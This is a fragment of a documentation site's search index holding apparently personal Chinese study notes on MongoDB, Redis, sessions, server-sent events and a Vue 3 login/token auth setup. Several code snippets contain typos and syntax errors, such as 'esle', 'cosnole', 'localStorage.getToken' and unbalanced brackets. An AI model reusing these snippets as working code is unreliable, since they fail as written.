\u4ee5\u540e\u53f0\u5b88\u62a4\u7684\u65b9\u5f0f\u8fdb\u884c\u542f\u52a8         | | --logpath | \u6307\u5b9a\u65e5\u5fd7\u6587\u4ef6\u8f93\u51fa\u8def\u5f84             | | --config  | \u6307\u5b9a\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6                 | | --auth    | \u4ee5\u5b89\u5168\u65b9\u5f0f\u542f\u52a8\u6570\u636e\u5e93\uff0c\u9ed8\u8ba4\u4e0d\u9a8c\u8bc1 |</p>"},{"location":"node/mongodb/#_2","title":"\u914d\u7f6e\u6587\u4ef6\u8def\u5f84","text":"<p>For Apple Silicon Processor <code>configuration file</code>:/opt/homebrew/etc/mongod.conf <code>log directory</code>: /opt/homebrew/var/log/mongodb <code>data directory</code>: /opt/homebrew/var/mongodb</p> <p>MongoDB configuration files use the YAML format. <pre><code>systemLog:\n   destination: file\n   path: \"/opt/homebrew/var/log/mongodb/mongod.log\"\n   logAppend: true\nprocessManagement:\n   fork: true\nstorage:\n  dbPath: /opt/homebrew/var/mongodb\nnet:\n   bindIp: 127.0.0.1\n   port: 27017\nsetParameter:\n   enableLocalhostAuthBypass: false\nsecurity:\n  authorization: enabled\n</code></pre></p> <p>\u5bfc\u5165\u5bfc\u51fa\u6570\u636e</p>"},{"location":"node/mongodb/#mongo","title":"mongo\u5b58\u50a8\u7ed3\u6784","text":"SQL term MongoDB term describe database database \u6570\u636e\u5e93 table collection row document index index"},{"location":"node/mongodb/#mongoose","title":"mongoose","text":"<p>orm odm</p>"},{"location":"node/mongodb/#mongoose_1","title":"\u5728\u9879\u76ee\u4e2d\u4f7f\u7528mongoose","text":"<pre><code>npm i mongoose -S\n</code></pre> <pre><code>const db = mongoose.createConnection(\"mongodb://usr:pass@ip:port/database\", {\n  useNewUrlParse: true,\n  useUnifiedTopology: true\n})\n</code></pre>"},{"location":"node/redis/","title":"Redis","text":"<p>redid official docs &gt; develop with redis</p>"},{"location":"node/redis/#_1","title":"\u5b89\u88c5\u548c\u542f\u52a8","text":"<p><pre><code>brew install redis\nbrew services start redis\n</code></pre> redis cli /usr/local/bin/redis-cli redis server /usr/local/bin/redis-server</p> <p>\u914d\u7f6e\u6587\u4ef6 /usr/local/etc/redis.conf /usr/local/etc/redis.conf.default</p> <p>brew services restart redis</p> <p>RedisClientOptions</p>"},{"location":"node/redis/#redis-in-nodejs","title":"redis in Node.js","text":""},{"location":"node/redis/#_2","title":"\u53d1\u5e03\u8ba2\u9605","text":""},{"location":"node/redis/#_3","title":"\u4e8b\u52a1","text":""},{"location":"node/redis/#_4","title":"\u5907\u4efd\u4e0e\u6062\u590d","text":""},{"location":"node/redis/#_5","title":"\u5b89\u5168","text":"<pre><code>127.0.0.1:6379&gt; CONFIG get requirepass\n1) \"requirepass\"\n2) \"\"\n127.0.0.1:6379&gt; CONFIG set requirepass \"xiyuan\"\nOK\n127.0.0.1:6379&gt; CONFIG get requirepass\n1) \"requirepass\"\n2) \"xiyuan\"\n127.0.0.1:6379&gt; AUTH xiyuan\nOK\n</code></pre>"},{"location":"node/session/","title":"Session","text":""},{"location":"node/session/#session","title":"session\u7684\u5b9e\u73b0","text":"<pre><code>const SESSION_KEY = 'connect.sid'\nconst sessions = {}\n\napp.get('/', (req,res)=&gt;{\n  const sessionId = req.cookies[SESSION_KEY]\n  if(sessionId){\n    //\n  } esle {\n    getUUID()\n  }\n})\n\nconst getUUID = () =&gt; {\n  let count = 0\n  return () =&gt; {\n    return (++count).toString()\n  }\n}()\n</code></pre> <pre><code>// 8-4-4-4-12\nexport const getUUID() {\n  [...crypto.getRandomValues(new Uint8Array(16))].map(b =&gt; b.toString(16).padStart(2,'0').join('-').replace(/(.{8})(.{4})(.{4})(.{4})(.{12})/, '$1-$2-$3-$4-$5');\n}\n</code></pre>"},{"location":"node/websocket/","title":"Websocket","text":""},{"location":"node/websocket/#server-sent-event","title":"server sent event","text":"<p>\u670d\u52a1\u7aef <pre><code>let sendCount = 1\napp.get('/news-feed', (req,res) =&gt; {\n  const SseStream = require('ssestream')\n  res.header(\"Content-Type\", \"text/event-strem\")\n  const sseStream = new SseStream(req)\n  sseStream.pipe(res)\n  const pusher = setInterval( () =&gt; {\n    sseStream.write({\n      id: sendCount++,\n      event: 'message',\n      data: {ts: new Date().toTimeString()}\n      retry: 20000,\n    })\n  }, 1000)\n\n  res.on('close', ()=&gt; {\n    clearInterval(pusher)\n    sseStream.unpipe(res)\n    )\n})\n</code></pre></p>"},{"location":"performance/","title":"Index","text":"<ul> <li>web cache</li> </ul> <p>end-user perceived latency</p>"},{"location":"projects/","title":"\u7535\u5546\u7c7b\u5c0f\u7a0b\u5e8f","text":"<ul> <li> \u9996\u9875\u6a21\u5757\u5f00\u53d1</li> <li> \u5206\u7c7b\u67e5\u8be2,\u5546\u54c1\u5217\u8868,\u5546\u54c1\u8be6\u60c5</li> <li> \u8d2d\u7269\u8f66\u6a21\u5757\u5f00\u53d1</li> <li> \u8ba2\u5355\u6a21\u5757\u5f00\u53d1</li> <li> \u652f\u4ed8\u6a21\u5757\u5f00\u53d1</li> <li> \u6211\u7684\u6a21\u5757\u5f00\u53d1</li> </ul>"},{"location":"projects/3rd-party-integration/","title":"\u7b2c\u4e09\u65b9\u5e93\u96c6\u6210","text":""},{"location":"projects/3rd-party-integration/#_1","title":"\u521b\u5efa\u9879\u76ee","text":"<pre><code>pnpm create vite vue3-auth --template vue-ts\ncd vu3-auth\n</code></pre>"},{"location":"projects/3rd-party-integration/#vue","title":"\u96c6\u6210vue\u8def\u7531","text":"<ol> <li> <p>\u5b89\u88c5\u4f9d\u8d56 <pre><code>pnpm install vue-router\n</code></pre></p> </li> <li> <p>\u5f15\u5165\u8def\u7531 <pre><code>src\\main.ts\nimport { createApp } from 'vue'\n+import router from \"./router/index\"\nimport App from './App.vue'\nconst app = createApp(App)\n+app.use(router)\napp.mount('#app')\n</code></pre></p> </li> <li> <p>\u914d\u7f6e\u8def\u7531 <code>src\\router\\index.ts</code> <pre><code>import { createRouter, createWebHistory, RouteRecordRaw } from \"vue-router\";\nconst routes: Array&lt;RouteRecordRaw&gt; = [\n    {\n      path: \"/\",\n      redirect: \"/home\",\n    },\n    {\n      path: \"/home\",\n      component: () =&gt; import(\"../views/Home/index.vue\")\n    },\n  ];\nexport default createRouter({\n  history: createWebHistory(),\n  routes,\n});\n</code></pre></p> </li> </ol>"},{"location":"projects/3rd-party-integration/#vite","title":"\u914d\u7f6evite\u8def\u5f84\u522b\u540d","text":"<p><code>vite.config.ts</code> <pre><code>export default defineConfig({\n  plugins:[vue()],\n+  resolve:{\n+    alias: [\n+      {\n+        find: \"@\",\n+        replacement: path.resolve(__dirname, \"src\")\n+      }\n+    ]\n+  }\n})\n</code></pre></p> <p><code>tsconfig.json</code></p> <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"useDefineForClassFields\": true,\n    \"module\": \"ESNext\",\n    \"lib\": [\"ES2020\", \"DOM\", \"DOM.Iterable\"],\n    \"skipLibCheck\": true,\n\n    /* Bundler mode */\n    \"moduleResolution\": \"bundler\",\n    \"allowImportingTsExtensions\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"preserve\",\n\n    /*  Linting */\n    \"strict\": false,\n    \"noImplicitAny\": false,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"baseUrl\": \".\",\n    \"paths\": {\n      \"@/*\": [\"src/*\"]\n    },\n    \"types\": [\"element-plu/global\"]\n  },\n  \"include\":[\"src/**/*.ts\", \"src/**/*.tsx\", \"src/**/*.vue\"],\n  \"references\": [{\"path\":\"./tsconfig.node.json\"}]\n}\n</code></pre>"},{"location":"projects/3rd-party-integration/#pinia","title":"\u96c6\u6210Pinia","text":"<ul> <li>\u5b89\u88c5\u4f9d\u8d56\uff1a<code>pnpm install pinia</code></li> <li>\u5f15\u5165pinia <code>src/main.ts</code> <pre><code>import {createApp} from 'vue'\nimport App from './App.vue'\nimport router from './router/index'\n+import {createPinia} from 'pinia'\n\nconst app = createApp(App)\napp.use(router)\n+app.use(createPinia())\napp.mount('#app')\n</code></pre></li> </ul> <p><code>src/stores/user.ts</code> <pre><code>import {defineStore} from 'pinia'\nimport {reactive} from 'vue'\n\n\nexport const useUserStore = defineStore(\"user\", () =&gt; {\n  const state = reactive({\n    token: \"\"\n  })\n  const toLogin = async(loginInfo) =&gt; {\n    const response = await login()\n    const {token} = response.data\n    state.token = token\n    setToken(token)\n  } catch (err) {\n    cosnole.log(`error: ${error}`)\n    return Promise.reject(err)\n  }\n  return {\n    state,\n    toLogin\n  }\n})\n</code></pre></p> <p><code>src/vies/Login/index.vue</code> <pre><code>&lt;script lang=\"ts\" setup&gt;\nimport {useUserStore} from '@/store/user'\nimport {useRouter} from 'vue-router'\n\nconst userStore = useUserStore()\nconst router = useRouter()\n\n\nconst handleLogin = () =&gt; {\n  useStroe.toLogin(loginState.loginForm)\n  router.push({path:\"/\"})\n}\n</code></pre></p>"},{"location":"projects/3rd-party-integration/#element-plus","title":"\u96c6\u6210element-plus","text":"<p><code>tsconfig.json</code></p> <p>\u4fee\u6539ts\u914d\u7f6e,\u8bbf\u95ee\u7ec4\u4ef6\u7c7b\u578b\u5b9a\u4e49\u6587\u4ef6 <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"useDefineForClassFields\": true,\n    \"module\": \"ESNext\",\n    \"lib\": [\"ES2020\", \"DOM\", \"DOM.Iterable\"],\n    \"skipLibCheck\": true,\n\n    /* Bundler mode */\n    \"moduleResolution\": \"bundler\",\n    \"allowImportingTsExtensions\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"preserve\",\n\n    /* Linting */\n    \"strict\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"baseUrl\": \".\",\n    \"paths\": {\n      \"@/*\": [\"src/*\"]\n    },\n+   \"types\": [\"element-plus/global\"] // \u7ec4\u4ef6\u7c7b\u578b\u6587\u4ef6\n  },\n  \"include\": [\"src/**/*.ts\", \"src/**/*.tsx\", \"src/**/*.vue\"],\n  \"references\": [{ \"path\": \"./tsconfig.node.json\" }]\n}\n\n\u5168\u5c40\u5f15\u5165\n\n```ts\nimport ElementPlus from 'element-plus'\nimport \"element-plus/dist/index.css\"\napp.use(ElementPlus)\n</code></pre></p> <p>\u6309\u9700\u5f15\u5165</p> <p>```</p>"},{"location":"projects/auth/","title":"Auth","text":"<ul> <li>vue\u5b9e\u73b0</li> <li>react\u5b9e\u73b0</li> </ul>"},{"location":"projects/auth/#vue3","title":"\u6743\u9650(vue3\u5b9e\u73b0)","text":""},{"location":"projects/auth/#_1","title":"\u7ed8\u5236\u767b\u5f55\u9875","text":"<ul> <li>\u6dfb\u52a0\u767b\u5f55\u9875\u8def\u7531\u914d\u7f6e <code>src/router/index.ts</code></li> </ul> <pre><code>const routes: RouteRecordRaw[] = [\n+  {\n+  path: \"/login\",\n+  name: \"/login\",\n+  component: () =&gt; import(\"@/views/Login/index.vue\")\n+  }\n]\n</code></pre> <ul> <li>\u521b\u5efa\u767b\u5f55\u8868\u5355 <code>views/Login/index.vue</code> <pre><code>&lt;template&gt;\n    &lt;el-form class=\"login-form\"&gt;\n        &lt;el-form-item prop=\"username\"&gt;\n            &lt;el-input placeholder=\"\u7528\u6237\u540d\" v-model=\"loginForm.usename\"/&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item prop=\"password\"&gt;\n            &lt;el-input placeholder=\"\u5bc6\u7801\" v-model=\"loginForm.password\"/&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-button type=\"primary\" @click=\"handleClick\"&gt;Login&lt;/el-button&gt;\n    &lt;/el-form&gt;\n&lt;/template&gt;\n&lt;script lang=\"ts\" setup&gt;\nimport {reactive, toRefs} from \"vue\"\nconst loginState = reactive({\n  loginForm: { username: \"\", password: \"\"}\n})\nconst {loginForm} = toRefs(loginState)\nconst handleLogin = () =&gt; {\n  loginForm\n}\n&lt;/script&gt;\n</code></pre></li> </ul> <pre><code>## \u63a5\u5165\u548c\u8c03\u901a\u767b\u5f55\u63a5\u53e3\n\n- \u6dfb\u52a0\u4ee3\u7406\u914d\u7f6e\uff0c\u4f7f\u5f97`/api`\u8def\u5f84\u7684\u8bf7\u6c42\u88ab\u4ee3\u7406\u5230\u6307\u5b9a\u7684\u540e\u7aef\u670d\u52a1\u5668\n`vite.config.ts`\n\n```diff\nimport { defineConfig } from \"vite\";\nimport vue from \"@vitejs/plugin-vue\";\nimport path from \"path\";\nexport default defineConfig({\n  plugins: [vue()],\n  resolve: {\n    alias: [\n      {\n        find: \"@\",\n        replacement: path.resolve(__dirname, \"src\"),\n      },\n    ],\n  },\n+ server: {\n+   proxy: {\n+     \"/api\": {\n+       target: \"http://localhost:3000\",\n+       ws: true,\n+       changeOrigin: true\n+     }\n+   }\n+ }\n\n})\n</code></pre> <ul> <li>\u8bbe\u7f6e\u8bf7\u6c42\u62e6\u622a \u521b\u5efaAxios\u5b9e\u4f8b\u5e76\u914d\u7f6e\u8bf7\u6c42\u548c\u54cd\u5e94\u62e6\u622a\uff0cba \u8bf7\u6c42\u62e6\u622a\uff1a\u7528\u4e8e\u5728\u8bf7\u6c42\u5934\u4e2d\u6dfb\u52a0token \u54cd\u5e94\u62e6\u622a: \u5904\u7406\u54cd\u5e94\u6570\u636e\u548c\u9519\u8bef <code>src/api/request.ts</code></li> </ul> <pre><code>import axios from 'axios'\nimport {ElMessage} from 'element-plus'\nimport {getToken} from '@/utils/auth'\nconst request = axios.create({\n  timeout: 10000,\n  baseURL: '/api'\n})\n\nrequest.interceptors.request.use(\n  (config) =&gt; {\n    const token = getToken()\n    // \u5982\u679c\u4fdd\u5b58token\u5219\u5f53\u524d\u8bf7\u6c42\u7684\u8bf7\u6c42\u5934\u4e0a\u643a\u5e26token\n    if (token){\n      config.headers.Authorization = `Bearer ${token}`\n    }\n    return config\n  },\n  (err) =&gt; {\n    console.log(`Request intercept error: ${err}`)\n    return Promise.reject(err)\n  }\n)\n\nrequest.interceptors.response.use(\n  (response) =&gt; {\n    if (response.data) {\n      const {code,message} = response.data\n      if (code !== 0) {\n        ElMessage.error(message);\n        return Promise.reject(new Error(message))\n      }\n      return response.data\n    }\n  },\n  (err) =&gt; {\n    console.error(`Response error: ${err}`)\n    ElMessage.error(err.response?.data?.message || err.message || \"\u53d1\u751f\u9519\u8bef\")\n    return Promise.reject(err)\n  }\nexport default request\n</code></pre> <ul> <li> <p>\u5b9a\u4e49\u767b\u5f55API\u8bf7\u6c42 <code>src/api/user.ts</code> \u5b58\u653e\u7528\u6237\u76f8\u5173API\u8bf7\u6c42 <pre><code>import request from './request'\nexport const login = (data) =&gt; {\n  return request.post(\"/auth/login\",data)\n}\n</code></pre></p> </li> <li> <p>\u8ba4\u8bc1\u5de5\u5177\u65b9\u6cd5: \u5b9a\u4e49\u4e86\u5904\u7406token\u7684\u65b9\u6cd5,\u5305\u62ec\u83b7\u53d6\u3001\u8bbe\u7f6e\u3001\u79fb\u9664token\u7684\u65b9\u6cd5 <code>src/utils/auth.ts</code> <pre><code>const TOKEN = \"token\"\nexport const setToken = (token:stirng): void =&gt; {\n  return localStorage.setItem(TOKEN, token)\n}\nexport const getToken = (token:string): void =&gt; {\n  return localStorage.getToken(TOKEN)\n}\n</code></pre></p> </li> <li> <p>\u66f4\u65b0\u7528\u6237Store <code>src/stores/user.ts</code></p> </li> </ul> <pre><code>import {defineStore} from 'pinia'\nimport {login} from '@/api/user'\n\nexport const userStore = definStore(\"user\",() =&gt; {\n\n  const state = reactive({\n    token:''\n  })\n\n  const toLogin = async (loginInfo) =&gt; {\n    const response = await login(loginInfo)\n    const {token} = response.data\n    state.token = token\n    setToken(token) // \u628atoken\u5b58\u5728\u672c\u5730\u5728\u6bcf\u6b21\u53d1\u8d77\u8bf7\u6c42\u65f6\u5e26\u4e0atoken\n  }\n\n  return {\n    state,\n    toLogin\n  }\n})\n</code></pre> <ul> <li>\u767b\u5f55\u9875</li> </ul> <p><code>src/views/Login/index.vue</code></p> <pre><code>&lt;template&gt;\n  &lt;el-form className=\"login-form\"&gt;\n    &lt;el-form-tiem prop=\"username\"&gt;\n        &lt;el-input placeholder=\"\u7528\u6237\u540d\" v-model=\"loginForm.username\"/&gt;\n    &lt;/el-form-tiem&gt;\n    &lt;el-form-tiem prop=\"password\"&gt;\n        &lt;el-input placeholder=\"\u5bc6\u7801\" v-model=\"loginForm.password\"/&gt;\n    &lt;/el-form-tiem&gt;\n    &lt;el-button type=\"primary\" @click=\"handleLogin\"&gt;Login&lt;/el-button&gt;\n  &lt;/el-form&gt;\n&lt;/tempalte&gt;\n\n&lt;script lang=\"ts\" setup&gt;\nimport {reactive, toRefs} from 'vue'\nimport {useUserStore} from '@/stores/user'\nimport {useRouter} from 'vue-router'\nconst userStore = useUserStore()\nconst router = useRouter()\n\n\nconst loginState = reactive({\n    loginForm: { username:'',password:''}\n})\n\nconst {loginForm} = toRefs(loginState)\nconst handleLogin = async () =&gt; {\n  await userStore.toLogin(loginForm)\n  router.push({path:'/'})\n}\n\n&lt;/script&gt;\n</code></pre>"},{"location":"projects/auth/#_2","title":"\u767b\u5f55\u9a8c\u8bc1","text":"<ol> <li>\u521b\u5efa\u8def\u7531\u5b88\u536b\uff0c</li> </ol> <p>\u8fd9\u4e2a\u5b88\u536b\u9996\u5148\u68c0\u67e5\u7528\u6237\u662f\u5426\u6709\u6548token\uff0c \u5982\u679c\u6301\u6709\u6709\u6548token\uff0c\u5e76\u4e14\u5c1d\u8bd5\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u4ed6\u4eec\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\u9762\uff0c\u4ed6\u4eec\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\u9762\u3002 \u5982\u679c\u672a\u767b\u5f55\uff0c\u5e76\u4e14\u5c1d\u8bd5\u8bbf\u95ee\u975e\u767d\u540d\u5355\u8def\u5f84\uff0c\u5c06\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\u9762\uff0c\u5e76\u9644\u5e26\u539f\u672c\u5c1d\u8bd5\u8bbf\u95ee\u7684\u8def\u5f84\u4fe1\u606f</p> <p><code>src/permission.ts</code></p> <pre><code>import router from '@/router'\nconst LOGIN_PATH = '/login'\nconst WHITE_LIST = [LOGIN_PATH]\n\nrouter.beforeEach( to =&gt; {\n  // \u4ece\u672c\u5730\u4e2d\u53d6\u51fatoken\n  const token = getToken()\n  // \u68c0\u67e5\u5230token\u662f\u6709\u6548\u7684\n  if (token) {\n    if (to.path === LOGIN_PATH) {\n      return { path: '/home', replace: true }\n    }\n    return true\n  }\n  if (WHITE_LIST.includes(to.path)) {\n    return true\n  }\n  return {\n    path: LOGIN_PATH,\n    query: {redirce: to.path, ...to.path}\n  }\n\n})\n</code></pre> <ul> <li>\u5728\u5e94\u7528\u5165\u53e3\u5f15\u5165\u5b88\u536b</li> </ul> <p><code>src/main.ts</code></p> <pre><code>import {createApp} from 'vue'\nimport App from './App.vue' //\u5f15\u5165\u6839\u7ec4\u4ef6\nimport router from './router/index'\nimport {createPinia} from 'pinia'\nimport './permission' // \u8def\u7531\u5b88\u536b\nconst app = createApp(App)\napp.use(router)\napp.use(createPinia())\napp.mount('#app')\n</code></pre>"},{"location":"projects/auth/#_3","title":"\u767b\u5f55\u6210\u529f\u540e\u8df3\u8f6c","text":"<ul> <li>\u521b\u5efa\u89e3\u6790\u8def\u7531\u53c2\u6570\u7684\u94a9\u5b50<code>useRouteQuery</code> \u4f7f\u7528Vue Router \u7684<code>useRoute</code>\u6765\u53d6\u5f97\u5f53\u524d\u8def\u7531\u7684\u67e5\u8be2\u53c2\u6570\uff0c \u5e76\u63d0\u53d6\u91cd\u5b9a\u5411\u5730\u5740<code>redirect</code>\u548c\u5176\u4ed6\u67e5\u8be2\u53c2\u6570<code>otherQuery</code></li> <li>\u91cd\u6784\u767b\u5f55\u7ec4\u4ef6 \u5728\u767b\u5f55\u9875\u4e2d\uff0c\u5f15\u5165<code>useRouteQuery</code>\u94a9\u5b50\uff0c\u5728\u7528\u6237\u767b\u5f55\u6210\u529f\u540e\uff0c\u6839\u636e\u83b7\u53d6\u7684<code>redirect</code>\u503c\u6765\u51b3\u5b9a\u8df3\u8f6c\u5730\u5740\u3002\u5982\u679c\u5b58\u5728\u91cd\u5b9a\u5411\u5730\u5740\uff0c\u5219\u8df3\u8f6c\u5230\u8be5\u5730\u5740\uff08\u5e76\u786e\u4fdd\u643a\u5e26\u4e0a\u5269\u4e0b\u7684\u8def\u7531\u53c2\u6570\uff09,\u5426\u5219\u5219\u9ed8\u8ba4\u8df3\u8f6c\u5230\u4e3b\u9875</li> </ul> <p><code>src/hooks/useRouteQuery.ts</code></p> <pre><code>import {useRoute} from 'vue-router'\nimport {ref,computed, watchEffect} from 'vue'\nconst useRouteQuery = () =&gt; {\n  const route = useRoute()\n  const redirect = ref(\"\")\n  const otherQuery = ref({})\n\n  const redirectComputed = computed(() =&gt; route.query.redirect || '')\n  const getOtherQuery = (query) =&gt; {\n    const {redirect, ...otherQuery} = query\n    return otherQuery\n  }\n  const otherQueryComputed = computed(() =&gt; getOtherQuery(route.query))\n  watchEffect(() =&gt; {\n    otherQuery.value = otherQueryComputed.value\n    redirect.value = redirectComputed.value as string\n  })\n  return {\n    redirect,\n    otherQuery\n  }\n}\n</code></pre>"},{"location":"projects/auth/#react","title":"React\u5b9e\u73b0","text":"<ul> <li>\u5b57\u6bb5\u6743\u9650\uff08\u5bc6\u7801\uff09</li> <li>\u529f\u80fd\u6743\u9650</li> <li>\u5ba2\u6237\u7aef\u8def\u7531\u6743\u9650</li> <li>\u63a5\u53e3\u8c03\u7528\u6743\u9650 \u8bf7\u6c42 <pre><code>headers: {\n  \"Content-Type\": \"application/json\",\n  // \"application/octet-stream\" \u6587\u4ef6\n  //  \"multipart/form-data\"\n  // \"application/x-www-form-urlencoded\" boydy of HTTP message sent to the server essentially query string: name/value pairs separted by ampersand(&amp;).and names are separated from values by the equals symbol (=).\n  \"Accept\": \"application/json\"\n}\n\nconst WHITE_LIST = ['/login']\n  requestInterceptors: [\n    (url, config) =&gt; {\n      const {apis} = currentUser\n      // \u63a5\u53e3\u8c03\u7528\u6743\u9650\u68c0\u67e5\n      const hasPermisssion = apis.some(api =&gt; api.method = config.method &amp;&amp; new Regex(api.path).test(url)\n        if (hasPermission) {\n          return {url, config}\n        } else {\n          return\n        }\n    }\n  ]\nconst {access_token, refresh_token} = tokens\n</code></pre></li> </ul>"},{"location":"projects/buffer-and-view/","title":"\u7f13\u5b58\u548c\u89c6\u56fe","text":"<ul> <li>JavaScript typed arrays @ MDN &gt; References &gt; JavaScript &gt; Guide &gt; JavaScript typed arrays</li> <li>TypedArray or DataView: Understanding byte order @ MDN Hacks</li> <li>Typed arrays - Binary data in the browser: Binary Data in the Browser @ web.dev &gt; Home &gt; Articles</li> </ul>"},{"location":"projects/buffer-and-view/#file","title":"File","text":"<p>File\u5e38\u7528\u5c5e\u6027\u6709: <code>File.name</code>\uff1a \u53ea\u8bfb, \u8fd4\u56de\u5f53\u524dFile\u5bf9\u8c61\u6240\u7528\u5f15\u7528\u6587\u4ef6\u540d <code>File.type</code>: \u53ea\u8bfb,\u8fd4\u56de\u6587\u4ef6\u7684\u591a\u7528\u9014\u4e92\u8054\u7f51\u90ae\u4ef6\u6269\u5c55\u7c7b\u578b(MIME type) <code>File.size</code>: \u53ea\u8bfb,\u8fd4\u56de\u5f53\u524dFile\u5bf9\u8c61\u7684\u5927\u5c0f</p> <p><code>FileList</code>: <code>&lt;input type=\"file\"&gt;</code>\u5143\u7d20\u6709\u4e2afiles\u5c5e\u6027, <code>dragenter, dragover,drop, dropleave</code> \u4e8b\u4ef6\u4e2d\u4e5f\u6709\u4e2afiles\u5c5e\u6027,\u7528\u6765\u5b58\u50a8\u7528\u6237\u6240\u9009\u62e9\u7684\u6587\u4ef6, \u5f53\u7528\u6237\u901a\u8fc7(\u70b9\u51fb\u6216\u62d6\u653e\uff09\u9009\u62e9\u6587\u4ef6\u540e\uff0c\u4fbf\u53ef\u4ee5\u83b7\u5f97\u9009\u62e9\u7684\u6587\u4ef6\u5bf9\u5e94\u7684<code>FileList</code>\u5bf9\u8c61</p> <pre><code>const fileList = document.querySelector(\"input[type='file']\").files\nconsole.log(fileList)\n</code></pre> <pre><code> document.getElementById('upload-container').addEventListener('drop', (e)=&gt;{\n   const file =  e.dataTransfer.files[0]\n   console.log(file)\n})\n</code></pre>"},{"location":"projects/buffer-and-view/#blob","title":"Blob","text":"<p>Blob\u662f<code>Binary Large object</code>\u7684\u7f29\u5199\uff0c</p> <p>Blob\u5e38\u7528\u5c5e\u6027\u548c\u65b9\u6cd5</p> <pre><code>/**\n* @param {Array} blobParts/array \u4e00\u4e2a\u53ef\u9009\u7684\u7531ArrayBuffer, ArrayBufferView, Blob, DOMString \u7b49\u5bf9\u8c61\u6784\u6210\u7684\u6570\u7ec4\n* @param {Object} options \u4e00\u4e2a\u53ef\u9009\u7684BlobPropertyBag\u5b57\u5178\n*/\nnew Blob()\n</code></pre> <p>options \u662f\u4e00\u4e2a\u53ef\u9009\u7684BlobPropertyBag\u5b57\u5178\uff0c\u5b83\u53ef\u80fd\u4f1a\u6307\u5b9a\u5982\u4e0b\u4e24\u4e2a\u5c5e\u6027\uff1a</p> <p>type\uff0c\u9ed8\u8ba4\u503c\u4e3a \"\"\uff0c\u5b83\u4ee3\u8868\u4e86\u5c06\u4f1a\u88ab\u653e\u5165\u5230blob\u4e2d\u7684\u6570\u7ec4\u5185\u5bb9\u7684MIME\u7c7b\u578b\u3002 endings\uff0c\u9ed8\u8ba4\u503c\u4e3a\"transparent\"\uff0c\u7528\u4e8e\u6307\u5b9a\u5305\u542b\u884c\u7ed3\u675f\u7b26\\n\u7684\u5b57\u7b26\u4e32\u5982\u4f55\u88ab\u5199\u5165\u3002 &gt;\u5b83\u662f\u4ee5\u4e0b\u4e24\u4e2a\u503c\u4e2d\u7684\u4e00\u4e2a\uff1a &gt;\"native\"\uff0c\u4ee3\u8868\u884c\u7ed3\u675f\u7b26\u4f1a\u88ab\u66f4\u6539\u4e3a\u9002\u5408\u5bbf\u4e3b\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u7684\u6362\u884c\u7b26\uff0c\u6216\u8005 &gt;\"transparent\"\uff0c\u4ee3\u8868\u4f1a\u4fdd\u6301blob\u4e2d\u4fdd\u5b58\u7684\u7ed3\u675f\u7b26\u4e0d\u53d8</p> <p><code>Blob.slice([start[,end[,contentType])</code>:\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684 Blob \u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u6e90 Blob \u5bf9\u8c61\u4e2d\u6307\u5b9a\u8303\u56f4\u5185\u7684\u6570\u636e\u3002\uff08\u7531\u4e8eFile\u7ee7\u627f\u81eaBlob\uff0c\u53ef\u7528\u6b64\u65b9\u6cd5\u5206\u5272\u672c\u5730\u6587\u4ef6\uff0c\u5b9e\u73b0\u5206\u7247\u4e0a\u4f20\uff09 <code>Blob.arrayBuffer()</code></p>"},{"location":"projects/buffer-and-view/#arraybuffer","title":"ArrayBuffer","text":"<p>\u4f60\u4eceXHR\u3001File API\u3001Canvas\u7b49\u7b49\u5404\u79cd\u5730\u65b9\uff0c\u8bfb\u53d6\u4e86\u4e00\u5927\u4e32\u5b57\u8282\u6d41</p> <p>ArrayBuffer\u7b80\u5355\u8bf4\u5c31\u662f\u4e00\u7247\u5185\u5b58\uff0c\u8868\u793a\u539f\u59cb\u4e8c\u8fdb\u5236\u6570\u636e\u7f13\u51b2\u533a\u3002\u4f46\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c\u5b83\uff0c\u800c\u662f\u8981\u901a\u8fc7View-TypedArray\u6216DataView\u5bf9\u8c61\u6765\u64cd\u4f5c\u5b83\uff0c\u5b83\u4eec\u4f1a\u5c06\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e\u8868\u793a\u4e3a\u7279\u5b9a\u7684\u683c\u5f0f\uff0c\u5e76\u901a\u8fc7\u8fd9\u4e9b\u683c\u5f0f\u6765\u8bfb\u5199\u7f13\u51b2\u533a\u7684\u5185\u5bb9\u3002TypedArray\u7ed9ArrayBuffer\u63d0\u4f9b\u4e86\u4e00\u4e2a\u201cView\u201d\uff0c</p>"},{"location":"projects/buffer-and-view/#typearray","title":"TypeArray","text":"<p>are array-like objects that provide a mechanism for reading and writing raw binary data in memory buffers.(\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\u8bfb\u53d6\u548c\u5199\u5165\u539f\u59cb\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u673a\u5236\u3002)</p> <p>A buffer is an object representing a chunk of data; it has no format to speak of, and offers no mechanism for accessing its contents. In order to access the memory contained in a buffer, you need to use a view. A view provides a context \u2014 that is, a data type, starting offset, and number of elements. 